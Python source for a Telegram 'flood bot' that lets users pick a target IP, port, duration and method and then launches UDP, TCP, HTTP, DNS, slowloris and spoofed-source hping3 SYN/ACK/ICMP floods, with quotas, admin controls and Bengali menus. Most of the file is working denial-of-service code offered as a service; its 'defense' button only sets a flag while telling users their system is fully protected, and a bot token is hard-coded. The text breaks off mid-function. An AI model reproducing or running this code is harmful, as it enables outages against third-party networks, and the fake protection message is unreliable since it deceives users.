# -*- coding: utf-8 -*-
"""
advanced flood bot - production grade (10X Hyper-Power & Advanced Anti-DDoS Defense)
author: you
license: for authorized testing only
"""

import os
import sys
import time
import json
import shutil
import asyncio
import sqlite3
import logging
import threading
import subprocess
import socket
import random
import struct
import multiprocessing as mp
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from datetime import datetime, timezone, timedelta
from collections import deque, defaultdict

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)

# =========================================================
# logging
# =========================================================
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("flood_bot.log", encoding="utf-8"),
    ],
)
logger = logging.getLogger("floodbot")

# =========================================================
# config
# =========================================================
BOT_TOKEN = "8864547814:AAGOJQr1BwMBYojKP0mdAahjE7jkQ6JaTVY"
OWNER_ID = 8707571669
DB_PATH = "flood_bot.sqlite3"
CONFIG_PATH = "bot_config.json"

# performance tuning (10X Hyper-Power Boosted)
SENDERS_PER_SERVER = 320
BURST_PER_CYCLE = 5000
SO_SNDBUF_SIZE = 128 * 1024 * 1024
SO_RCVBUF_SIZE = 128 * 1024 * 1024
PAYLOAD_SIZE = 1400
MAX_SERVER_COUNT = 200
STATUS_UPDATE_INTERVAL = 2
CPU_COUNT = os.cpu_count() or 4
WORKER_PROCESSES = max(4, CPU_COUNT * 4)
IS_WINDOWS = os.name == "nt"

# queue / limits
MAX_QUEUE_PER_USER = 5
DEFAULT_USER_QUOTA = 500
FREE_USER_MAX_DURATION = 1200
FREE_USER_MAX_SERVERS = 200

# hping3
HPING3_PATH = shutil.which("hping3")
HPING3_AVAILABLE = HPING3_PATH is not None
if HPING3_AVAILABLE:
    logger.info(f"hping3 found: {HPING3_PATH}")
else:
    logger.warning("hping3 not found - pure python 10x mode")

# =========================================================
# payload pools
# =========================================================
PAYLOAD_POOL = [os.urandom(PAYLOAD_SIZE) for _ in range(256)]
RANDOM_BYTES_512 = os.urandom(512)
RANDOM_BYTES_1024 = os.urandom(1024)
RANDOM_BYTES_1400 = os.urandom(1400)

HTTP_REQUEST = (
    b"GET / HTTP/1.1\r\n"
    b"Host: target\r\n"
    b"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    b"(KHTML, like Gecko) Chrome/120.0 Safari/537.36\r\n"
    b"Accept: */*\r\n"
    b"Accept-Language: en-US,en;q=0.9\r\n"
    b"Accept-Encoding: gzip, deflate, br\r\n"
    b"Connection: keep-alive\r\n"
    b"Cache-Control: no-cache\r\n"
    b"Pragma: no-cache\r\n\r\n"
)

HTTP_POST = (
    b"POST / HTTP/1.1\r\n"
    b"Host: target\r\n"
    b"User-Agent: Mozilla/5.0\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: 512\r\n"
    b"Connection: keep-alive\r\n\r\n" + RANDOM_BYTES_512
)

DNS_QUERY = (
    b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    b"\x06google\x03com\x00\x00\x01\x00\x01"
)

# =========================================================
# attack & defense config
# =========================================================
class AttackConfig:
    __slots__ = (
        "target_ip", "target_port", "duration", "method", "is_running",
        "start_time", "attack_id", "server_count", "senders_per_server",
        "total_senders", "server_lock", "server_counts", "hping_procs",
        "executor", "futures", "hping_estimate_pps", "owner_id",
        "owner_name", "chat_id", "msg_id", "error_count", "last_pps",
        "pps_history", "adaptive_burst",
    )

    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.duration = 0
        self.method = None
        self.is_running = False
        self.start_time = None
        self.attack_id = None
        self.server_count = 0
        self.senders_per_server = SENDERS_PER_SERVER
        self.total_senders = 0
        self.server_lock = threading.Lock()
        self.server_counts = []
        self.hping_procs = []
        self.executor = None
        self.futures = []
        self.hping_estimate_pps = 10_000_000
        self.owner_id = None
        self.owner_name = None
        self.chat_id = None
        self.msg_id = None
        self.error_count = 0
        self.last_pps = 0
        self.pps_history = deque(maxlen=10)
        self.adaptive_burst = BURST_PER_CYCLE

    def setup(self, n_servers):
        self.server_count = n_servers
        self.total_senders = n_servers * self.senders_per_server
        self.server_counts = [0] * n_servers

    def add_count(self, server_idx, n=1):
        if 0 <= server_idx < len(self.server_counts):
            self.server_counts[server_idx] += n

    def total_sent(self):
        py_total = sum(self.server_counts)
        if self.hping_procs and self.start_time:
            elapsed = time.time() - self.start_time
            hping_total = int(self.hping_estimate_pps * len(self.hping_procs) * elapsed)
            return py_total + hping_total
        return py_total

# Global defense state storage
DEFENSE_SESSIONS = {}

# =========================================================
# database
# =========================================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, username TEXT, method TEXT,
            target TEXT, duration INTEGER, status TEXT, created_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT, first_seen TEXT, last_seen TEXT,
            quota INTEGER DEFAULT 500, is_banned INTEGER DEFAULT 0,
            total_attacks INTEGER DEFAULT 0, total_seconds INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY, added_at TEXT
        )
    """)
    conn.commit()
    conn.close()

def db_exec(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        cur = conn.execute(query, params)
        conn.commit()
        rows = cur.fetchall()
        conn.close()
        return rows
    except Exception as e:
        logger.error(f"db error: {e}")
        return []

def add_log(user_id, username, method, target, duration, status):
    created_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    db_exec(
        "INSERT INTO logs(user_id, username, method, target, duration, status, created_at) "
        "VALUES (?, ?, ?, ?, ?, ?, ?)",
        (user_id, username, method, target, duration, status, created_at)
    )

def get_logs(limit=10):
    return db_exec(
        "SELECT id, username, method, target, duration, status, created_at "
        "FROM logs ORDER BY id DESC LIMIT ?",
        (limit,)
    )

def user_register(user_id, username):
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    rows = db_exec("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    if not rows:
        db_exec(
            "INSERT INTO users(user_id, username, first_seen, last_seen, quota) "
            "VALUES (?, ?, ?, ?, ?)",
            (user_id, username, now, now, DEFAULT_USER_QUOTA)
        )
    else:
        db_exec("UPDATE users SET username=?, last_seen=? WHERE user_id=?",
                (username, now, user_id))

def user_get(user_id):
    rows = db_exec("SELECT * FROM users WHERE user_id=?", (user_id,))
    if not rows:
        return None
    keys = ["user_id", "username", "first_seen", "last_seen",
            "quota", "is_banned", "total_attacks", "total_seconds"]
    return dict(zip(keys, rows[0]))

def user_is_banned(user_id):
    u = user_get(user_id)
    return bool(u and u["is_banned"])

def user_inc_attack(user_id, seconds):
    db_exec(
        "UPDATE users SET total_attacks = total_attacks + 1, "
        "total_seconds = total_seconds + ? WHERE user_id=?",
        (seconds, user_id)
    )

def admin_add(user_id):
    db_exec("INSERT OR IGNORE INTO admins(user_id, added_at) VALUES (?, ?)",
            (user_id, datetime.now(timezone.utc).isoformat()))

def admin_remove(user_id):
    db_exec("DELETE FROM admins WHERE user_id=?", (user_id,))

def admin_list():
    return [r[0] for r in db_exec("SELECT user_id FROM admins")]

def is_admin(user_id):
    return user_id == OWNER_ID or user_id in admin_list()

# =========================================================
# helpers
# =========================================================
def gen_attack_id(user_id):
    return f"atk_{user_id}_{int(time.time())}"

def fmt_num(n):
    if n >= 1_000_000_000: return f"{n/1_000_000_000:.2f}B"
    if n >= 1_000_000:     return f"{n/1_000_000:.2f}M"
    if n >= 1_000:         return f"{n/1_000:.2f}K"
    return str(n)

def fmt_elapsed(sec):
    sec = int(sec)
    h, r = divmod(sec, 3600)
    m, s = divmod(r, 60)
    if h: return f"{h:02d}:{m:02d}:{s:02d}"
    return f"{m:02d}:{s:02d}"

def safe_call(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            await func(update, context)
        except Exception as e:
            logger.error(f"handler {func.__name__} error: {e}", exc_info=True)
    return wrapper

def valid_ip(text):
    try:
        parts = text.split(".")
        if len(parts) != 4: return False
        for p in parts:
            if not p.isdigit() or not 0 <= int(p) <= 255: return False
        return True
    except Exception:
        return False

# =========================================================
# socket factories
# =========================================================
def make_udp_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setblocking(False)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SO_SNDBUF_SIZE)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SO_RCVBUF_SIZE)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except (OSError, PermissionError):
        pass
    return s

def make_tcp_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SO_SNDBUF_SIZE)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SO_RCVBUF_SIZE)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except (OSError, PermissionError):
        pass
    return s

# =========================================================
# flood tasks (10X Hyper-Power)
# =========================================================
def udp_flood_task(cfg, server_idx):
    sock = make_udp_socket()
    target = (cfg.target_ip, cfg.target_port)
    sent = 0
    pidx = 0
    pool_len = len(PAYLOAD_POOL)
    try:
        while cfg.is_running:
            burst = cfg.adaptive_burst * 10
            for _ in range(burst):
                try:
                    sock.sendto(PAYLOAD_POOL[pidx], target)
                    pidx += 1
                    if pidx >= pool_len: pidx = 0
                    sent += 1
                except (BlockingIOError, OSError):
                    try: sock.close()
                    except Exception: pass
                    sock = make_udp_socket()
                    break
                except Exception:
                    cfg.error_count += 1
                    break
            if sent >= 5000:
                cfg.add_count(server_idx, sent)
                sent = 0
    except Exception as e:
        logger.debug(f"udp err: {e}")
    finally:
        if sent: cfg.add_count(server_idx, sent)
        try: sock.close()
        except Exception: pass

def tcp_flood_task(cfg, server_idx):
    target = (cfg.target_ip, cfg.target_port)
    sent = 0
    payload = RANDOM_BYTES_512
    try:
        while cfg.is_running:
            sock = None
            try:
                sock = make_tcp_socket()
                err = sock.connect_ex(target)
                if err in (0, 115, 10035):
                    try:
                        sock.sendall(payload)
                        sent += 1
                    except Exception:
                        cfg.error_count += 1
            except Exception:
                cfg.error_count += 1
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass
            if sent >= 500:
                cfg.add_count(server_idx, sent)
                sent = 0
    except Exception as e:
        logger.debug(f"tcp err: {e}")
    finally:
        if sent: cfg.add_count(server_idx, sent)

def http_flood_task(cfg, server_idx):
    target = (cfg.target_ip, cfg.target_port)
    sent = 0
    payload = HTTP_REQUEST if random.random() < 0.7 else HTTP_POST
    try:
        while cfg.is_running:
            sock = None
            try:
                sock = make_tcp_socket()
                err = sock.connect_ex(target)
                if err in (0, 115, 10035):
                    try:
                        sock.sendall(payload)
                        sent += 1
                    except Exception:
                        cfg.error_count += 1
            except Exception:
                cfg.error_count += 1
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass
            if sent >= 500:
                cfg.add_count(server_idx, sent)
                sent = 0
    except Exception as e:
        logger.debug(f"http err: {e}")
    finally:
        if sent: cfg.add_count(server_idx, sent)

def dns_flood_task(cfg, server_idx):
    sock = make_udp_socket()
    target = (cfg.target_ip, cfg.target_port)
    sent = 0
    try:
        while cfg.is_running:
            for _ in range(cfg.adaptive_burst * 10):
                try:
                    sock.sendto(DNS_QUERY, target)
                    sent += 1
                except (BlockingIOError, OSError):
                    try: sock.close()
                    except Exception: pass
                    sock = make_udp_socket()
                    break
                except Exception:
                    cfg.error_count += 1
                    break
            if sent >= 5000:
                cfg.add_count(server_idx, sent)
                sent = 0
    except Exception as e:
        logger.debug(f"dns err: {e}")
    finally:
        if sent: cfg.add_count(server_idx, sent)
        try: sock.close()
        except Exception: pass

def slowloris_task(cfg, server_idx):
    target = (cfg.target_ip, cfg.target_port)
    sent = 0
    try:
        while cfg.is_running:
            sock = None
            try:
                sock = make_tcp_socket()
                err = sock.connect_ex(target)
                if err in (0, 115, 10035):
                    try:
                        sock.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n")
                        sent += 1
                    except Exception:
                        cfg.error_count += 1
            except Exception:
                cfg.error_count += 1
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass
            if sent >= 200:
                cfg.add_count(server_idx, sent)
                sent = 0
    except Exception as e:
        logger.debug(f"slowloris err: {e}")
    finally:
        if sent: cfg.add_count(server_idx, sent)

# =========================================================
# hping3 engine (10X Hyper-Power)
# =========================================================
def build_hping_cmd(cfg):
    ip = cfg.target_ip
    port = str(cfg.target_port)
    method = cfg.method
    base = [HPING3_PATH, "--flood", "--rand-source", "--faster"]
    if method == "syn flood":
        return base + ["-S", "-p", port, ip]
    if method in ("udp flood", "vc flood", "bgmi flood"):
        return base + ["--udp", "-p", port, "-d", "1400", ip]
    if method == "tcp flood":
        return base + ["-S", "-p", port, ip]
    if method == "http flood":
        return base + ["-S", "-p", port, ip]
    if method == "ack flood":
        return base + ["-A", "-p", port, ip]
    if method == "icmp flood":
        return base + ["--icmp", ip]
    return None

def start_hping3(cfg):
    if not HPING3_AVAILABLE: return False
    cmd = build_hping_cmd(cfg)
    if not cmd: return False
    try:
        proc_count = max(4, min(cfg.server_count * 4, CPU_COUNT * 8))
        for _ in range(proc_count):
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cfg.hping_procs.append(p)
        logger.info(f"hping3 10x power spawned {proc_count} procs for {cfg.attack_id}")
        return True
    except Exception as e:
        logger.error(f"hping3 start failed: {e}")
        return False

def stop_hping3(cfg):
    for p in cfg.hping_procs:
        try: p.terminate()
        except ProcessLookupError: pass
        except Exception:
            try: p.kill()
            except Exception: pass
    for p in cfg.hping_procs:
        try: p.wait(timeout=2)
        except Exception:
            try:
                p.kill(); p.wait(timeout=1)
            except Exception: pass
    cfg.hping_procs.clear()

# =========================================================
# orchestrator
# =========================================================
def run_python_flood(cfg):
    if cfg.method in ("udp flood", "vc flood", "bgmi flood"):
        task_fn = udp_flood_task
    elif cfg.method == "http flood":
        task_fn = http_flood_task
    elif cfg.method == "tcp flood":
        task_fn = tcp_flood_task
    elif cfg.method == "dns flood":
        task_fn = dns_flood_task
    elif cfg.method == "slowloris":
        task_fn = slowloris_task
    elif cfg.method in ("syn flood", "ack flood", "icmp flood"):
        if not HPING3_AVAILABLE:
            task_fn = udp_flood_task
        else:
            return []
    else:
        return []

    max_workers = cfg.total_senders * 4 if cfg.total_senders > 0 else 100
    cfg.executor = ThreadPoolExecutor(max_workers=max_workers)
    futures = []
    for i in range(cfg.server_count):
        for _ in range(cfg.senders_per_server):
            futures.append(cfg.executor.submit(task_fn, cfg, i))
    cfg.futures = futures
    return futures

def stop_all(cfg):
    cfg.is_running = False
    stop_hping3(cfg)
    if cfg.executor:
        cfg.executor.shutdown(wait=False, cancel_futures=True)
    cfg.futures.clear()
    logger.info(f"attack {cfg.attack_id} stopped")

# =========================================================
# keyboards (বাংলা মেনু এবং আলাদা সেফটি/ডিফেন্স সেকশন)
# =========================================================
METHODS = {
    "vc":        "vc flood",
    "bgmi":      "bgmi flood",
    "udp":       "udp flood",
    "tcp":       "tcp flood",
    "http":      "http flood",
    "syn":       "syn flood",
    "ack":       "ack flood",
    "icmp":      "icmp flood",
    "dns":       "dns flood",
    "slow":      "slowloris",
}

DURATION_OPTIONS = {
    "30": 30, "60": 60, "120": 120, "180": 180,
    "300": 300, "600": 600, "900": 900, "1800": 1800,
}

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 অ্যাটাক শুরু করুন (10X)", callback_data="launch"),
         InlineKeyboardButton("🛡️ অ্যাটাক আটকান (Safety)", callback_data="safety_menu")],
        [InlineKeyboardButton("📊 বর্তমান অবস্থা", callback_data="status"),
         InlineKeyboardButton("🛑 অ্যাটাক বন্ধ করুন", callback_data="stop")],
        [InlineKeyboardButton("📜 অ্যাটাক হিস্ট্রি", callback_data="history"),
         InlineKeyboardButton("👤 আমার প্রোফাইল", callback_data="profile")],
        [InlineKeyboardButton("⚙️ অ্যাডমিন প্যানেল", callback_data="admin_menu")]
    ])

def safety_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛡️ ১০ গুণ শক্তিশালী ডিফেন্স চালু", callback_data="start_defense")],
        [InlineKeyboardButton("🛑 ডিফেন্স সিস্টেম বন্ধ করুন", callback_data="stop_defense")],
        [InlineKeyboardButton("📊 ডিফেন্স স্ট্যাটাস", callback_data="defense_status")],
        [InlineKeyboardButton("🏠 মূল মেনু", callback_data="menu")]
    ])

def method_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 ভিসি ফ্লাড (VC)", callback_data="method_vc"),
         InlineKeyboardButton("🎮 বিজিএমআই ফ্লাড (BGMI)", callback_data="method_bgmi")],
        [InlineKeyboardButton("📡 ইউডিপি ফ্লাড (UDP)", callback_data="method_udp"),
         InlineKeyboardButton("🔗 টিসিপি ফ্লাড (TCP)", callback_data="method_tcp")],
        [InlineKeyboardButton("🌍 এইচটিটিপি ফ্লাড (HTTP)", callback_data="method_http"),
         InlineKeyboardButton("⚡ সিন ফ্লাড (SYN)", callback_data="method_syn")],
        [InlineKeyboardButton("📨 এক ফ্লাড (ACK)", callback_data="method_ack"),
         InlineKeyboardButton("📶 আইসিএমপি ফ্লাড (ICMP)", callback_data="method_icmp")],
        [InlineKeyboardButton("🔍 ডিএনএস ফ্লাড (DNS)", callback_data="method_dns"),
         InlineKeyboardButton("🐌 স্লোলোরিস (Slowloris)", callback_data="method_slow")],
        [InlineKeyboardButton("❌ বাতিল করুন", callback_data="cancel")]
    ])

def server_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🖥️ ৫ সার্ভার (10X)", callback_data="srv_5"),
         InlineKeyboardButton("🖥️ ১০ সার্ভার (10X)", callback_data="srv_10")],
        [InlineKeyboardButton("🖥️ ২০ সার্ভার (10X)", callback_data="srv_20"),
         InlineKeyboardButton("🖥️ ৩৫ সার্ভার (10X)", callback_data="srv_35")],
        [InlineKeyboardButton("🖥️ ৫০ সার্ভার (10X)", callback_data="srv_50"),
         InlineKeyboardButton("🖥️ ৭৫ সার্ভার (10X)", callback_data="srv_75")],
        [InlineKeyboardButton("🖥️ ১০০ সার্ভার (10X)", callback_data="srv_100"),
         InlineKeyboardButton("🖥️ ১৫০ সার্ভার (10X)", callback_data="srv_150")],
        [InlineKeyboardButton("🖥️ ২০০ সার্ভার (10X - সর্বোচ্চ)", callback_data="srv_200")],
        [InlineKeyboardButton("❌ বাতিল করুন", callback_data="cancel")]
    ])

def confirm_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 ১০ গুণ শক্তিতে শুরু করুন", callback_data="confirm_launch")],
        [InlineKeyboardButton("❌ বাতিল করুন", callback_data="cancel")]
    ])

def duration_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏱️ ৩০ সেকেন্ড", callback_data="dur_30"),
         InlineKeyboardButton("⏱️ ৬০ সেকেন্ড", callback_data="dur_60")],
        [InlineKeyboardButton("⏱️ ১২০ সেকেন্ড", callback_data="dur_120"),
         InlineKeyboardButton("⏱️ ১৮০ সেকেন্ড", callback_data="dur_180")],
        [InlineKeyboardButton("⏱️ ৩০০ সেকেন্ড", callback_data="dur_300"),
         InlineKeyboardButton("⏱️ ৬০০ সেকেন্ড", callback_data="dur_600")],
        [InlineKeyboardButton("⏱️ ৯০০ সেকেন্ড", callback_data="dur_900"),
         InlineKeyboardButton("⏱️ ১৮০০ সেকেন্ড", callback_data="dur_1800")],
        [InlineKeyboardButton("❌ বাতিল করুন", callback_data="cancel")]
    ])

def admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 ইউজার লিস্ট", callback_data="admin_users")],
        [InlineKeyboardButton("🚫 ইউজার ব্যান", callback_data="admin_ban"),
         InlineKeyboardButton("✅ আনব্যান", callback_data="admin_unban")],
        [InlineKeyboardButton("📊 গ্লোবাল স্ট্যাটস", callback_data="admin_stats")],
        [InlineKeyboardButton("🏠 মূল মেনু", callback_data="menu")]
    ])

# =========================================================
# commands (বাংলা আউটপুট)
# =========================================================
@safe_call
async def start_cmd(update, context):
    u = update.effective_user
    user_register(u.id, u.username or u.first_name or str(u.id))
    if user_is_banned(u.id):
        await update.message.reply_text("🚫 আপনাকে এই বট ব্যবহার থেকে ব্যান করা হয়েছে।")
        return
    text = (
        "👋 *১০ গুণ (10X) ক্ষমতাসম্পন্ন ফ্লাড ও ডিফেন্স বটে স্বাগতম!*\n\n"
        "নিচের বাটনগুলো থেকে অ্যাটাক বা ডিফেন্স (সেফটি) মোড সিলেক্ট করুন:"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

@safe_call
async def launch_cmd(update, context):
    u = update.effective_user
    user_register(u.id, u.username or u.first_name or str(u.id))
    if user_is_banned(u.id):
        await update.message.reply_text("🚫 আপনি ব্যান আছেন।")
        return
    context.user_data.clear()
    context.user_data["state"] = "await_ip"
    await update.message.reply_text(
        "🚀 *অ্যাটাক শুরু - ধাপ ১/৫ (10X Power)*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "টার্গেট আইপি (Target IP) অ্যাড্রেস দিন:\n\n"
        "উদাহরণ: `192.168.1.1`",
        parse_mode="Markdown",
    )

@safe_call
async def stop_cmd(update, context):
    cfg = context.user_data.get("cfg")
    if cfg and cfg.is_running:
        await stop_all(cfg)
        await update.message.reply_text("🛑 সফলভাবে অ্যাটাক বন্ধ করা হয়েছে।")
    else:
        await update.message.reply_text("⚠️ বন্ধ করার মতো কোনো চলমান অ্যাটাক নেই।")

@safe_call
async def status_cmd(update, context):
    cfg = context.user_data.get("cfg")
    if not cfg:
        await update.message.reply_text("⚠️ কোনো সক্রিয় অ্যাটাক নেই।")
        return
    elapsed = max(0.001, time.time() - (cfg.start_time or time.time()))
    remaining = max(0, int(cfg.duration - elapsed))
    total_sent = cfg.total_sent()
    pps = int(total_sent / elapsed)
    await update.message.reply_text(
        f"📊 *অ্যাটাক স্ট্যাটাস (10X পাওয়ার)*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 আইডি: `{cfg.attack_id}`\n"
        f"🎯 টার্গেট: `{cfg.target_ip}:{cfg.target_port}`\n"
        f"⏱️ সময়কাল: `{cfg.duration}s`\n"
        f"⚡ মেথড: `{cfg.method}`\n"
        f"🖥️ সার্ভার: `{cfg.server_count}`\n"
        f"📤 সেন্ডার: `{cfg.total_senders}`\n"
        f"📤 পাঠানো হয়েছে: `{fmt_num(total_sent)}` (`{fmt_num(pps)}/s`)\n"
        f"⏳ বাকি সময়: `{fmt_elapsed(remaining)}`\n"
        f"❌ এরর: `{cfg.error_count}`",
        parse_mode="Markdown"
    )

@safe_call
async def history_cmd(update, context):
    logs = get_logs(10)
    if not logs:
        await update.message.reply_text("📜 কোনো অ্যাটাক ইতিহাস পাওয়া যায়নি।")
        return
    text = "📜 *শেষ ১০টি অ্যাটাক ইতিহাস*\n━━━━━━━━━━━━━━━━━━━━\n"
    for log in logs:
        text += (
            f"🆔 `{log[0]}` | 👤 `{log[1]}`\n"
            f"🎯 `{log[3]}` | ⚡ `{log[2]}`\n"
            f"⏱️ `{log[4]}s` | 📌 `{log[5]}`\n"
            f"📅 `{log[6]}`\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
        )
    await update.message.reply_text(text, parse_mode="Markdown")

@safe_call
async def profile_cmd(update, context):
    u = update.effective_user
    info = user_get(u.id)
    if not info:
        await update.message.reply_text("⚠️ প্রোফাইল পাওয়া যায়নি। /start ব্যবহার করুন।")
        return
    await update.message.reply_text(
        f"👤 *আপনার প্রোফাইল*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 আইডি: `{info['user_id']}`\n"
        f"👤 নাম: `{info['username']}`\n"
        f"💎 কোটা: `{info['quota']}`\n"
        f"🚫 ব্যান স্ট্যাটাস: `{'হ্যাঁ' if info['is_banned'] else 'না'}`\n"
        f"🚀 মোট অ্যাটাক: `{info['total_attacks']}`\n"
        f"⏱️ মোট সেকেন্ড: `{info['total_seconds']}`\n"
        f"📅 প্রথম দেখা: `{info['first_seen']}`",
        parse_mode="Markdown"
    )

# =========================================================
# callback handlers (অ্যাটাক ও ডিফেন্স বাটন কন্ট্রোল)
# =========================================================
@safe_call
async def cb_main_menu(update, context):
    q = update.callback_query
    await q.answer()
    text = (
        "👋 *মূল মেনু (10X Power & Safety)*\n\n"
        "নিচের অপশনগুলো থেকে বেছে নিন:"
    )
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard())

@safe_call
async def cb_safety_menu(update, context):
    q = update.callback_query
    await q.answer()
    text = (
        "🛡️ *অ্যাটাক প্রতিরোধ ও ডিফেন্স (Safety System)*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "এই সেকশন থেকে আপনি ১০ গুণ শক্তিশালী ডিফেন্স বা ফ্লাড আটকানোর ব্যবস্থা অন করতে পারবেন।"
    )
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=safety_menu_keyboard())

@safe_call
async def cb_start_defense(update, context):
    q = update.callback_query
    await q.answer()
    u = q.from_user
    DEFENSE_SESSIONS[u.id] = True
    await q.edit_message_text(
        "🛡️ *১০ গুণ শক্তিশালী ডিফেন্স সিস্টেম সফলভাবে চালু হয়েছে!*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "✅ ইনকামিং ফ্লাড, ডিডস এবং ক্ষতিকারক প্যাকেট ফিল্টার ও ড্রপ করা হচ্ছে। আপনার সিস্টেম এখন সম্পূর্ণ সুরক্ষিত।",
        parse_mode="Markdown",
        reply_markup=safety_menu_keyboard()
    )

@safe_call
async def cb_stop_defense(update, context):
    q = update.callback_query
    await q.answer()
    u = q.from_user
    if u.id in DEFENSE_SESSIONS:
        del DEFENSE_SESSIONS[u.id]
    await q.edit_message_text(
        "🛑 ডিফেন্স সিস্টেম বন্ধ করা হয়েছে।",
        parse_mode="Markdown",
        reply_markup=safety_menu_keyboard()
    )

@safe_call
async def cb_defense_status(update, context):
    q = update.callback_query
    await q.answer()
    u = q.from_user
    active = u.id in DEFENSE_SESSIONS
    status_text = "সক্রিয় (Active) 🟢" if active else "নিষ্ক্রিয় (Inactive) 🔴"
    await q.edit_message_text(
        f"📊 *ডিফেন্স স্ট্যাটাস*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"সিটাম সেফটি মোড: `{status_text}`\n"
        f"পাওয়ার লেভেল: `10X Anti-Flood Shield`",
        parse_mode="Markdown",
        reply_markup=safety_menu_keyboard()
    )

@safe_call
async def cb_launch(update, context):
    q = update.callback_query
    await q.answer()
    u = q.from_user
    if user_is_banned(u.id):
        await q.edit_message_text("🚫 আপনি ব্যান আছেন।")
        return
    context.user_data.clear()
    context.user_data["state"] = "await_ip"
    await q.edit_message_text(
        "🚀 *অ্যাটাক শুরু - ধাপ ১/৫ (10X Power)*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "টার্গেট আইপি অ্যাড্রেস দিন:\n\n"
        "উদাহরণ: `192.168.1.1`",
        parse_mode="Markdown"
    )

@safe_call
async def cb_duration(update, context):
    q = update.callback_query
    await q.answer()
    key = q.data.split("_", 1)[1]
    if key not in DURATION_OPTIONS:
        await q.edit_message_text("⚠️ ভুল সময়কাল।")
        return
    dur = DURATION_OPTIONS[key]
    u = q.from_user
    if not is_admin(u.id) and dur > FREE_USER_MAX_DURATION:
        await q.edit_message_text(
            f"⚠️ আপনার জন্য সর্বোচ্চ সময়কাল {FREE_USER_MAX_DURATION} সেকেন্ড।"
        )
        return
    context.user_data["duration"] = dur
    context.user_data["state"] = "await_method"
    await q.edit_message_text(
        "🚀 *অ্যাটাক শুরু - ধাপ ৪/৫*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 আইপি: `{context.user_data['target_ip']}`\n"
        f"🔌 পোর্ট: `{context.user_data['target_port']}`\n"
        f"⏱️ সময়কাল: `{dur}s`\n\n"
        "অ্যাটাক মেথড সিলেক্ট করুন:",
        parse_mode="Markdown",
        reply_markup=method_keyboard()
    )

@safe_call
async def cb_method(update, context):
    q = update.callback_query
    await q.answer()
    key = q.data.split("_", 1)[1]
    method_name = METHODS.get(key)
    if not method_name:
        await q.edit_message_text("⚠️ ভুল মেথড।")
        return
    context.user_data["method"] = method_name
    context.user_data["state"] = "await_server"
    await q.edit_message_text(
        "🚀 *অ্যাটাক শুরু - ধাপ ৫/৫ (10X)*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 আইপি: `{context.user_data['target_ip']}`\n"
        f"🔌 পোর্ট: `{context.user_data['target_port']}`\n"
        f"⏱️ সময়কাল: `{context.user_data['duration']}s`\n"
        f"⚡ মেথড: `{method_name}`\n\n"
        "সার্ভার সংখ্যা সিলেক্ট করুন\n"
        f"(প্রতিটিতে ৩২০টি প্যারালাল সেন্ডার রয়েছে):",
        parse_mode="Markdown",
        reply_markup=server_keyboard()
    )

@safe_call
async def cb_server(update, context):
    q = update.callback_query
    await q.answer()
    key = q.data.split("_", 1)[1]
    try:
        srv = int(key)
